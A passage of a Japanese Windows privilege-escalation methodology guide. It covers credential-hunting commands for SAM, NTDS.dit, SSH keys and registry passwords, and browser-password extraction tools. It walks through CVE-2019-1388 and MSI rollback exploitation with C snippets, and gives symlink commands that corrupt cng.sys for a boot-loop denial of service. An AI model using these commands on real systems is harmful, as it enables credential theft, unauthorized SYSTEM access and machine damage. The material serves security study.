dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### ごみ箱内の認証情報

アクセス可能なごみ箱の項目を確認し、削除されたバックアップや構成アーカイブ、認証情報を明示する名前のファイルを探します。有用な `.7z`、`.zip`、`.rar` バックアップは、数か月前のもので、ありふれたファイル名が付いている場合もあります。Windows は元のパスと削除時刻を `$I` レコードに、削除されたファイルを対応する `$R` エントリに保存します。アーカイブを開く前に、メタデータと現在のIDによる読み取りアクセス権を確認してください。表示される項目はボリューム、ユーザー SID、ファイルのアクセス許可によって異なるため、一覧が空でも、復元可能なバックアップがないとは限りません。アーカイブ名は確認候補として扱い、有効なシークレットが含まれている証拠とは見なさないでください。

アクセス可能な削除済み `.pfx` は、**code-signing** の手がかりにもなります。アクセス可能な秘密鍵が含まれていれば、その鍵で変更した PowerShell スクリプトに署名できます。[PowerShell には秘密鍵を持つ code-signing 証明書が必要です](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature)。また、[AppLocker の発行元ルールでは、署名者のIDとルールの適用範囲が評価されます](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker)。別アカウントで実行するには、現在のIDが対象のスクリプトそのものを変更できること、適用されるルールがそのスクリプトと対象アカウントに対する変更後の署名を許可すること、さらにスケジュールされたタスクなどの高い権限を持つ実行主体が実際にそのスクリプトを実行することが必要です。`.pfx` というファイル名、証明書のサブジェクト、または書き込み可能なスクリプトだけでは、この一連の条件が成立する証拠にはなりません。秘密鍵のデータを開いたりタスクを実行したりする前に、メタデータ、ACL、ポリシー、スケジュールされたコマンドを確認してください。

また、アクセス可能なメッセージングクライアントのプロファイルデータベース、メモ、受信ファイルも確認し、認証情報の手がかりを探してください。BitLocker 回復キーのエクスポートは HTML または TXT として保存されている場合があり、名前付きバックアップアーカイブの中に含まれていることもあります。こうしたデータを使って、古いバックアップを含む別の暗号化データボリュームにアクセスできる場合があります。アクセスが許可されている場合に限り、ボリュームとアーカイブを調べてください。バックアップに `NTDS.dit` が含まれている場合、オフラインでドメイン認証情報を復元するには、[バックアップと特権グループのワークフロー](../active-directory-methodology/privileged-groups-and-token-privileges.md)で説明されているとおり、対応する `SYSTEM` hive も必要です。ファイル名やロックされたボリュームだけでは、使用可能な回復キーやドメインバックアップが存在する証拠にはなりません。

複数のプログラムに保存された**パスワードを復元する**には、次を使用できます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**認証情報が含まれている可能性のあるその他のレジストリキー**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**registry から openssh keys を抽出する。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザーの履歴

**Chrome、Edge、または Firefox** のパスワードが保存されているデータベースを確認してください。\
また、ブラウザーの履歴、ブックマーク、お気に入りも確認し、そこに**パスワードが保存されていないか**調べてください。

現在のユーザーの標準的な Edge **Default** profile では、`Login Data` は `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default` にあり、`Local State` はその親ディレクトリである `User Data` にあります。[Microsoft のドキュメントでは、既定の profile の場所が説明されています](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars)。別の profile や `UserDataDir` policy によって、場所が変更される場合もあります。ファイルが存在することは、認証情報の保存先候補を示すだけです。ファイルを読み取れること、該当ユーザーの DPAPI context またはその他の認可された key material があること、保存された login がより高い権限を持つアカウントのものかどうかを確認してください。パスのみを列挙する場合、データベースを開いたり、復号したパスワードを表示したりする必要はありません。

Firefox について、[Mozilla のドキュメント](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile)では、profile 内の `key4.db` と `logins.json` が、対になった key ファイルと暗号化された login ファイルであると説明されています。これらのファイルが存在することは、あくまで手掛かりです。両方のファイルが読み取り可能か、保存された entry が存在するか、認証情報を利用可能と判断する前に Primary Password によって key が保護されているかを確認してください。復元した認証情報が domain account のものである場合、そのアカウントに適用されるグループ制御権限と、そのグループの [LAPS password の読み取りまたは復号権限](../active-directory-methodology/laps.md)を個別に確認してください。ブラウザーの痕跡だけでは、administrator への経路があるとは判断できません。

ブラウザーからパスワードを抽出するツール:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL の上書き**

**Component Object Model (COM)** は、異なる言語で作られたソフトウェアコンポーネント間の**相互通信**を可能にする、Windows operating system に組み込まれた技術です。各 COM component は **class ID (CLSID)** によって**識別され**、各 component は、interface ID (IID) で識別される 1 つ以上の interface を通じて機能を公開します。

COM class と interface は、それぞれ **HKEY\CLASSES\ROOT\CLSID** と **HKEY\CLASSES\ROOT\Interface** の下にある registry で定義されています。この registry は **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** をマージして作成されます = **HKEY\CLASSES\ROOT.**

この registry の CLSID 内には、子 registry **InProcServer32** があります。そこには **DLL** を指す **default value** と、**Apartment**（シングルスレッド）、**Free**（マルチスレッド）、**Both**（シングルスレッドまたはマルチスレッド）、**Neutral**（スレッド非依存）のいずれかを指定できる **ThreadingModel** という値が含まれています。

![ブラウザーの履歴 - COM DLL の上書き: この registry の CLSID 内には、子 registry InProcServer32 があります。そこには DLL を指す default value と、値 ... が含まれています](<../../images/image (729).png>)

基本的に、実行される DLL を**上書きできれば**、その DLL が別のユーザーによって実行される場合に**権限を昇格**できます。

攻撃者が persistence の仕組みとして COM Hijacking をどのように利用するかについては、以下を参照してください。


{{#ref}}
com-hijacking.md
{{#endref}}

### **ファイルと registry 内の一般的なパスワード検索**

**ファイルの内容を検索する**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**特定のファイル名のファイルを検索する**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**レジストリでキー名とパスワードを検索する**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **はmsf**プラグインです。被害者のシステム内で認証情報を検索するすべてのmetasploit POST moduleを**自動的に実行する**ために作成しました。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)は、このページで紹介しているパスワードを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne)も、システムからパスワードを抽出する優れたツールです。

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher)は、データを平文で保存する複数のツール（PuTTY、WinSCP、FileZilla、SuperPuTTY、RDP）の**セッション**、**ユーザー名**、**パスワード**を検索します。

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

**SYSTEM として実行中のプロセスが、フルアクセス権で新しいプロセスを開く** (`OpenProcess()`) とします。同じプロセスが、**メインプロセスのすべてのオープンハンドルを継承する、低い権限で実行される新しいプロセスも作成します** (`CreateProcess()`)。\
その後、**低権限プロセスへのフルアクセス権**があれば、`OpenProcess()` で作成された**特権プロセスへのオープンハンドル**を取得し、**shellcode を inject できます**。\
この脆弱性の**検出と悪用方法**については、[こちらの例を参照してください。](leaked-handle-exploitation.md)\
**異なる権限レベルで継承されたプロセスおよびスレッドのオープンハンドル（フルアクセス以外も含む）をテストし、悪用する方法をより詳しく説明したこちらの投稿も参照してください。**(http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)

## Named Pipe Client Impersonation

**pipe** と呼ばれる共有メモリセグメントを使用すると、プロセス間の通信やデータ転送が可能になります。

Windows には **Named Pipes** という機能があり、異なるネットワーク上であっても、無関係なプロセス同士でデータを共有できます。これはクライアント/サーバーアーキテクチャに似ており、役割は **named pipe server** と **named pipe client** として定義されます。

**client** が pipe 経由でデータを送信すると、pipe を設定した **server** は、必要な **SeImpersonate** 権限を持っていれば、**client の ID を偽装できます**。偽装可能な pipe を介して通信する**特権プロセス**を特定できれば、作成した pipe とそのプロセスがやり取りした際に、そのプロセスの ID を採用して**より高い権限を取得できる可能性があります**。この攻撃の実行手順については、[**こちら**](named-pipe-client-impersonation.md)と[**こちら**](#from-high-integrity-to-system)に参考となるガイドがあります。

また、以下のツールを使うと、burp のようなツールで **named pipe の通信を傍受できます:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept)。**こちらのツールでは、すべての pipe を一覧表示して確認できるため、privescs の発見に役立ちます:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

サーバーモードの Telephony service (TapiSrv) は `\\pipe\\tapsrv` (MS-TRP) を公開します。リモートの認証済みクライアントは、mailslot ベースの非同期イベント経路を悪用し、`ClientAttach` を利用して、`NETWORK SERVICE` が書き込み可能な既存ファイルに対する任意の **4-byte write** を実行できます。その後、Telephony admin 権限を取得し、任意の DLL を service として読み込ませることができます。攻撃の全体的な流れは以下のとおりです。

- `pszDomainUser` に書き込み可能な既存パスを設定して `ClientAttach` を実行します → service は `CreateFileW(..., OPEN_EXISTING)` でそのファイルを開き、非同期イベントの書き込みに使用します。
- 各イベントは、`Initialize` の攻撃者が制御する `InitContext` をそのハンドルに書き込みます。`LRegisterRequestRecipient` (`Req_Func 61`) で line app を登録し、`TRequestMakeCall` (`Req_Func 121`) をトリガーして、`GetAsyncEvents` (`Req_Func 0`) で取得します。その後、登録解除/シャットダウンして、決定的な書き込みを繰り返します。
- `C:\Windows\TAPI\tsec.ini` の `[TapiAdministrators]` に自分を追加して再接続し、任意の DLL パスを指定して `GetUIDllName` を呼び出すと、`NETWORK SERVICE` として `TSPI_providerUIIdentify` が実行されます。

詳細:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## その他

### Windows で実行される可能性のあるファイル拡張子

**[https://filesec.io/](https://filesec.io/)** を確認してください。

### Markdown レンダラーを介した Protocol handler / ShellExecute の悪用

`ShellExecuteExW` に渡されるクリック可能な Markdown リンクは、危険な URI handler (`file:`、`ms-appinstaller:`、または登録済みの任意の scheme) を起動し、現在のユーザーとして攻撃者が制御するファイルを実行する可能性があります。詳細:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **パスワードを探すためのコマンドライン監視**

ユーザーとして shell を取得した際、**コマンドラインで認証情報を渡す**スケジュールされたタスクやその他のプロセスが実行されている場合があります。以下のスクリプトは、2 秒ごとにプロセスのコマンドラインを取得し、現在の状態と前回の状態を比較して、差分を出力します。

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## プロセスからパスワードを盗む

## 低権限ユーザーから NT\AUTHORITY SYSTEM へ（CVE-2019-1388）/ UAC Bypass

グラフィカルインターフェース（コンソールまたは RDP 経由）にアクセスでき、UAC が有効になっている場合、Microsoft Windows の一部のバージョンでは、権限のないユーザーからターミナルやその他のプロセスを「NT\AUTHORITY SYSTEM」として実行できます。

これにより、同じ脆弱性を利用して、権限昇格と UAC Bypass を同時に実行できます。また、何もインストールする必要はなく、この過程で使用されるバイナリは Microsoft によって署名・発行されています。

影響を受けるシステムには、次のものがあります。

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

この脆弱性を悪用するには、以下の手順を実行する必要があります:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

GitHub repository https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup> に必要なファイルと情報がすべてあります。

## 管理者の Medium から High 整合性レベルへの移行 / UAC Bypass

**整合性レベルについて学ぶには、こちらを読んでください：**


{{#ref}}
integrity-levels.md
{{#endref}}

次に、**UAC と UAC bypasses について学ぶには、こちらを読んでください：**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Upload Directory Junctions into a Served Root

アプリケーションは、予測可能な upload サブディレクトリを作成し、呼び出し元から渡されたファイル名でその中に書き込み、その後ファイルを処理する場合があります。低権限ユーザーがサーバー側の書き込み前にそのサブディレクトリを削除し、NTFS junction に置き換えられる場合、書き込みが junction をたどり、Web で配信されるディレクトリに到達する可能性があります。そこに配置したスクリプトは、サーバーがそのファイル形式を実行する場合、Web サービスの identity で実行される可能性があります。これはアプリケーション固有の任意書き込み境界です。書き込み可能な upload directory や既存の junction があるだけでは、これが可能だとは証明できません。

upload handler での正確なパス構築とタイミング、ユーザーがそのサブディレクトリに対して持つ実効的な削除／作成権限、宛先の実効 ACL、writer が reparse point をたどるかどうか、Web サーバーが宛先でファイルを実行するかどうかを確認してください。writer と Web サーバーのプロセス identity は、それぞれ別個に確認してください。受動的なインベントリでディレクトリ ACL や reparse metadata は確認できますが、handler の動作や、将来的な junction の置き換えを確認することはできません。実行が service account で行われる場合、別の token privilege の経路を検討する前に、**実際のプロセストークン**を確認してください。

## 任意のフォルダー削除／移動／名前変更から SYSTEM EoP へ

[**このブログ記事**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)で説明されている手法で、exploit code は[**こちら**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)にあります。<sup>[[31]](#references)[[32]](#references)</sup>

この攻撃は基本的に、Windows Installer の rollback 機能を悪用し、アンインストール処理中に正規ファイルを悪意のあるファイルに置き換えるものです。そのため、攻撃者は**悪意のある MSI installer**を作成して `C:\Config.Msi` フォルダーを乗っ取る必要があります。このフォルダーは後に Windows Installer が他の MSI package のアンインストール時に rollback files を保存するために使用されます。その rollback files に悪意のある payload が含まれるよう改変しておきます。

### Windows Installer COM cleanup-path injection (CVE-2025-27727)

低権限のクライアントは、`CMsiConfigurationManager` COM object (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`) を介して SYSTEM の `msiexec.exe` service にアクセスできます。リバースエンジニアリングにより、関連する `IMsiServer` の呼び出しは、vtable offset `0xA0` の `MsiBeginTransactionW`、`0xC8` の `SetEEUIDirectoryAndFilter`、`0x50` の `CleanupTempPackages` と特定されました。これらの名前と offset はリバースエンジニアリングによるもので、build によって異なる場合があります。<sup>[[41]](#references)</sup>

非管理者の場合、`SetEEUIDirectoryAndFilter` は、指定されたパスを `DELETE`、`FILE_FLAG_BACKUP_SEMANTICS`、および `FILE_FLAG_OPEN_REPARSE_POINT` を指定して開く間だけ、呼び出し元を impersonate します。これにより、呼び出し元がディレクトリを削除できることが確認され、reparse point をたどることも回避できます。しかし、確認した file object が後続の cleanup に結び付けられるわけではなく、その object が Windows Installer によって作成されたことも証明されません。<sup>[[41]](#references)</sup>

`MsiBeginTransactionW` の後、`SetEEUIDirectoryAndFilter` は、呼び出し元の filter 引数にかかわらず、そのパスをフォルダーとしてスケジュールします。service は `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages` の下に、名前付きの `REG_DWORD` 値を書き込みます。値の名前は呼び出し元が制御するパスで、データ `0x00000002` はフォルダーを示すフラグです。続いて `CleanupTempPackages(NULL, FALSE)` が cleanup に直接入ります。昇格された worker はレジストリ値を列挙し、パスの由来を確認せずにフォルダー項目を再帰的な `FDeleteFolder` に渡します。通常の削除に失敗した場合、コードはさらに `LockdownPath` を呼び出し、ファイル属性をクリアして再試行します。<sup>[[41]](#references)</sup>

`msi.dll` から特定された最小限の呼び出し順序は次のとおりです：<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

有用なプリミティブは junction によるリダイレクトではなく、パスの再利用です。攻撃者が作成した `C:\Config.Msi` を登録して削除し、その後 Windows Installer に同じパス名を、保護された rollback データとともに再作成させます。Cleanup は古い `TempPackages` の名前を信頼し、新しいディレクトリを SYSTEM として削除します。reparse point は不要なため、これは `FILE_FLAG_OPEN_REPARSE_POINT` と redirection-trust mitigation が意図する境界を回避します。<sup>[[41]](#references)</sup>

この削除プリミティブは、以下の rollback chain に適合します。別個の `Installer\Folders` レコードを保持し、保護された `C:\Config.Msi` を削除して、NULL DACL を設定して再作成します。その後、インストーラーが DACL を強化する前に、`WRITE_DAC` が許可されたハンドルを保持します。事前に開いたハンドルから `NtSetSecurityObject` で permissive な DACL を復元でき、その後 rollback の再開前に生成された `.rbs` を置き換えられます。<sup>[[41]](#references)</sup>

Microsoft は、新しい feature gate が有効な場合に `CMsiTransaction::SetEEUIDirectoryAndFilter` が `ScheduleFileOrFolderDelete` を呼び出さないようにして、この問題を修正しました。COM call は成功を返すことがありますが、攻撃者が制御するパスは `TempPackages` に登録されなくなります。method の戻り値が成功したかどうかで修正を確認するのではなく、2025 年 4 月の Windows security updates を適用してください。<sup>[[41]](#references)[[42]](#references)</sup>

手法の概要は次のとおりです。

1. **Stage 1 – Hijack の準備（`C:\Config.Msi` を空のままにする）**

- Step 1: MSI をインストールする
    - 書き込み可能なフォルダー（`TARGETDIR`）に無害なファイル（例: `dummy.txt`）をインストールする `.msi` を作成します。
    - インストーラーを **"UAC Compliant"** に設定し、**non-admin user** が実行できるようにします。
    - インストール後もファイルの **handle** を開いたままにします。

- Step 2: Uninstall を開始する
    - 同じ `.msi` を uninstall します。
    - Uninstall プロセスはファイルを `C:\Config.Msi` に移動し、`.rbf` ファイル（rollback backups）に名前を変更し始めます。
    - 開いているファイル handle を `GetFinalPathNameByHandle` で **poll** し、ファイルが `C:\Config.Msi\<random>.rbf` になるのを検出します。

- Step 3: Custom Syncing
    - `.msi` には、次の処理を行う **custom uninstall action (`SyncOnRbfWritten`)** が含まれています。
        - `.rbf` が書き込まれたことを通知します。
        - その後、別の event を待機してから uninstall を続行します。

- Step 4: `.rbf` の削除をブロックする
    - 通知を受けたら、`FILE_SHARE_DELETE` を指定せずに **`.rbf` ファイルを開きます**。これにより **削除を防止できます**。
    - その後、uninstall を完了できるよう、応答の signal を送ります。
    - Windows Installer は `.rbf` の削除に失敗し、内容をすべて削除できないため、**`C:\Config.Msi` は削除されません**。

- Step 5: `.rbf` を手動で削除する
    - 攻撃者が `.rbf` ファイルを手動で削除します。
    - これで **`C:\Config.Msi` は空になり、Hijack の準備が整います**。

> この時点で、**SYSTEM-level の任意フォルダー削除 vulnerability を発生させ、`C:\Config.Msi` を削除します**。

2. **Stage 2 – Rollback Scripts を悪意あるものに置き換える**

- Step 6: 弱い ACL で `C:\Config.Msi` を再作成する
    - `C:\Config.Msi` フォルダーを自分で再作成します。
    - **弱い DACL**（例: Everyone:F）を設定し、`WRITE_DAC` が許可された **handle を開いたままにします**。

- Step 7: 別の Install を実行する
    - 次の設定で `.msi` を再度インストールします。
        - `TARGETDIR`: 書き込み可能な場所。
        - `ERROROUT`: 強制的な失敗を発生させる変数。
    - この install を使って、`.rbs` と `.rbf` を読み取る **rollback** を再度発生させます。

- Step 8: `.rbs` を監視する
    - `ReadDirectoryChangesW` を使って `C:\Config.Msi` を監視し、新しい `.rbs` が現れるのを待ちます。
    - そのファイル名を記録します。

- Step 9: Rollback の前に同期する
    - `.msi` には、次の処理を行う **custom install action (`SyncBeforeRollback`)** が含まれています。
        - `.rbs` が作成されたときに event の signal を送ります。
        - その後、続行する前に待機します。

- Step 10: 弱い ACL を再適用する
    - `.rbs created` event を受け取った後:
        - Windows Installer は `C:\Config.Msi` に強い ACL を **再適用します**。
        - しかし、`WRITE_DAC` が許可された handle を引き続き保持しているため、**弱い ACL を再適用できます**。

> ACL は **handle を開くときにのみ適用される**ため、フォルダーへの書き込みは引き続き可能です。

- Step 11: 偽の `.rbs` と `.rbf` を配置する
    - `.rbs` ファイルを、Windows に次の処理を指示する **偽の rollback script** で上書きします。
        - `.rbf` ファイル（悪意ある DLL）を、**特権のある場所**（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）に復元します。
    - **SYSTEM-level の悪意ある payload DLL** を含む偽の `.rbf` を配置します。

- Step 12: Rollback を発生させる
    - sync event の signal を送り、インストーラーを再開させます。
    - **type 19 custom action (`ErrorOut`)** を、既知のポイントで意図的に install を失敗させるように設定します。
    - これにより **rollback が始まります**。

- Step 13: SYSTEM が DLL をインストールする
    - Windows Installer は次の処理を行います。
        - 悪意ある `.rbs` を読み取ります。
        - `.rbf` DLL をターゲットの場所にコピーします。
    - これで、**SYSTEM がロードするパスに悪意ある DLL が配置されます**。

- Final Step: SYSTEM のコードを実行する
    - Hijack した DLL をロードする、信頼された **auto-elevated binary**（例: `osk.exe`）を実行します。
    - **これでコードが SYSTEM として実行されます**。

### 任意のファイル削除/移動/名前変更から SYSTEM EoP へ

主な MSI rollback 手法（前述）は、**フォルダー全体**（例: `C:\Config.Msi`）を削除できることを前提としています。しかし、vulnerability で可能なのが **任意のファイル削除** だけだとしたらどうでしょうか？

**NTFS internals** を悪用できます。すべてのフォルダーには、次の名前の隠し alternate data stream があります。

```
C:\SomeFolder::$INDEX_ALLOCATION
```

この stream には、フォルダーの**インデックスメタデータ**が格納されています。

そのため、フォルダーの `::$INDEX_ALLOCATION` stream を**削除すると**、NTFS はファイルシステムから**フォルダー全体を削除します**。

これは、次のような標準のファイル削除 API を使って実行できます。
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> *ファイル*削除APIを呼び出しているにもかかわらず、**フォルダー自体が削除されます**。

### フォルダーの内容削除からSYSTEM EoPへ
任意のファイルやフォルダーは削除できないものの、攻撃者が制御するフォルダーの**内容は削除できる**primitiveがある場合はどうでしょうか？

1. Step 1: おとりのフォルダーとファイルを用意する
- 作成: `C:\temp\folder1`
- その中に作成: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt`に**oplock**を設定する
- 特権プロセスが`file1.txt`を削除しようとすると、oplockによって**実行が一時停止します**。

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Step 3: SYSTEM プロセスをトリガーする（例: `SilentCleanup`）
- このプロセスはフォルダー（例: `%TEMP%`）をスキャンし、その中身を削除しようとします。
- `file1.txt` に到達すると、**oplock がトリガーされ**、制御がコールバックに渡されます。

4. Step 4: oplock コールバック内で削除先をリダイレクトする

- Option A: `file1.txt` を別の場所に移動する
    - oplock を解除せずに `folder1` を空にします。
    - `file1.txt` を直接削除しないでください。oplock が早期に解除されます。

- Option B: `folder1` を **junction** に変換する:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- 選択肢 C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> これはフォルダのメタデータを保存する NTFS 内部ストリームを対象としており、これを削除するとフォルダが削除されます。

5. ステップ 5: oplock を解放する
- SYSTEM プロセスが処理を続け、`file1.txt` を削除しようとします。
- しかし、junction + symlink により、実際に削除されるのは次のものです。
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**結果**: `C:\Config.Msi` が SYSTEM によって削除される。

### 任意のフォルダー作成から永続的な DoS へ

**任意のフォルダーを SYSTEM/admin として作成できる** primitive を悪用します。**ファイルを書き込めない**、または**弱い権限を設定できない**場合でも可能です。

次のように、**重要な Windows driver** の名前を付けた**フォルダー**（ファイルではありません）を作成します。
```
C:\Windows\System32\cng.sys
```

- このパスは通常、`cng.sys` カーネルモードドライバーに対応します。
- **あらかじめフォルダーとして作成しておくと**、Windows は起動時に実際のドライバーを読み込めなくなります。
- その後、Windows は起動時に `cng.sys` を読み込もうとします。
- フォルダーを検出すると、**実際のドライバーを解決できず**、**クラッシュするか、起動が停止します**。
- **フォールバックはなく**、外部からの介入（ブート修復やディスクへのアクセスなど）がなければ、**復旧できません**。

### 特権ログ／バックアップのパス + OM symlinks による任意ファイル上書き／boot DoS

**特権サービス**が**書き込み可能な設定ファイル**から読み取ったパスにログ／エクスポートを書き込む場合、**Object Manager symlinks + NTFS mount points**でそのパスをリダイレクトすると、SeCreateSymbolicLinkPrivilege がなくても、特権による書き込みを任意ファイル上書きに利用できます。<sup>[[15]](#references)</sup>

**必要条件**
- 対象パスを保存した設定ファイルが攻撃者にとって書き込み可能であること（例: `%ProgramData%\...\.ini`）。
- `\RPC Control` への mount point と OM file symlink を作成できること（James Forshaw の [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。<sup>[[16]](#references)[[17]](#references)</sup>
- そのパスに書き込む特権操作（ログ、エクスポート、レポート）。

**攻撃チェーンの例**
1. 設定ファイルを読み、特権ログの保存先を確認します。例: `C:\ProgramData\ICONICS\IcoSetup64.ini` 内の `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`。
2. 管理者権限なしでパスをリダイレクトします:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 特権コンポーネントがログを書き込むのを待ちます（例: 管理者が「テストSMSを送信」を実行）。書き込み先は `C:\Windows\System32\cng.sys` になります。
4. 上書きされた対象を調べ（hex/PE parser）、破損を確認します。再起動すると、Windowsは改ざんされたドライバーのパスから読み込もうとするため、**ブートループDoS**が発生します。この手法は、特権サービスが書き込み用に開く保護対象ファイル全般に応用できます。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` から読み込まれますが、`C:\Windows\System32\cng.sys` にコピーが存在すると、そちらが先に読み込まれる可能性があるため、破損データを確実に書き込ませるDoSの標的になります。



## **High IntegrityからSystemへ**

### **新しいサービス**

すでにHigh Integrityプロセスで実行中の場合、**SYSTEMへの道筋**は、新しいサービスを**作成して実行する**だけで簡単に開けることがあります。

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> service binaryを作成する際は、有効なserviceであること、またはbinaryが必要なアクションをすばやく実行することを確認してください。有効なserviceでない場合、20秒後に強制終了されます。

### AlwaysInstallElevated

High Integrity processから、**AlwaysInstallElevatedのレジストリエントリを有効化**し、_**.msi**_ wrapperを使ってreverse shellを**インストール**できます。\
[関連するレジストリキーと_.msi_パッケージのインストール方法について詳しくはこちら。](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**コードは** [**こちらにあります**](seimpersonate-from-high-to-system.md)**.**

